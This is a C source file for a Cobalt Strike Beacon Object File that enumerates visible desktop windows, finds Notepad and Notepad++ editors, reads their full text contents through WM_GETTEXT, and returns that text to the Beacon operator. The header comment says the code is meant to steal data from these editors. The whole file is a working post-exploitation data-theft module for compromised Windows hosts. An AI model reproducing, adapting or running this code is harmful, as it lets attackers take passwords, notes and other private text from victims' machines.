#include <windows.h>
#include "bofdefs.h"
#include "base.c"
/*	Idea based on https://github.com/trainr3kt/NoteThief
	- The original only grabbed the highest level Z window
	- Searches all visible windows with non-null names
	- Adds ability to steal data from notepad++
	- Could potentially be expanded to allow specification of a string to search for in Window Name and a string to correspond to a control
*/

BOOL CALLBACK EnumWindowClasses(HWND hWndParent, LPARAM lParam)
{
	char ClassName[128] = {0};
	char WindowName[128] = {0};
	char *buffer;
	int len = 65535;
	char *needle = (char*) lParam;
	DWORD WinLen = USER32$GetClassNameA(hWndParent, ClassName, 127);
	WinLen = USER32$GetWindowTextA(hWndParent, WindowName, 127);

	if (ClassName[0] != 0 && WinLen){
		if(MSVCRT$strcmp(ClassName, needle) == 0) {
			buffer = (char*)MSVCRT$calloc(1, len+1);
			USER32$SendMessageA(hWndParent, WM_GETTEXT, len, (LPARAM)buffer);
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Notepad++ Found: %s\n%s", WindowName, buffer);
		}
	} 
	return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
	char WindowName[128] = {0};
	DWORD WinLen = USER32$GetWindowTextA(hwnd, WindowName, 127);

	if (WindowName[0] != 0 && WinLen){													// Did I get a window name
		if(USER32$IsWindowVisible(hwnd))												// Is the window name visible
		{
			PCHAR index = MSVCRT$strstr(WindowName, (char*)lParam);						// Is my search string in the window name
			if(index) {
				HWND editHwnd = NULL;
				char *buffer;
				int len = 65535;
				editHwnd = USER32$FindWindowExA(hwnd, NULL, "Edit", NULL);				// Edit is the default control for textarea in notepad
				if (editHwnd)
				{
					buffer = (char*)MSVCRT$calloc(1, len+1);
					USER32$SendMessageA(editHwnd, WM_GETTEXT,len,(LPARAM)buffer);
					char classname[128];
					USER32$GetClassNameA(editHwnd, (LPSTR) classname, 128);
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Notepad Found: %s\n%s\n", WindowName, buffer);
				} else {
					char *controlName = "Scintilla";									// It wasnt notepad, maybe notepad++, query the Scintilla control
					USER32$EnumChildWindows(hwnd, (WNDENUMPROC)EnumWindowClasses, (LPARAM) controlName);
				}
			} 
		}
		
	} 
	return TRUE;
}


void go(IN PCHAR Buffer, IN ULONG Length) {
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	const char *windowname = "Notepad";
	USER32$EnumDesktopWindows(NULL,(WNDENUMPROC)EnumWindowsProc,(LPARAM) windowname);
}

#ifndef BOF
int main() {
	go(NULL, 0);
	return 0;
}
#endif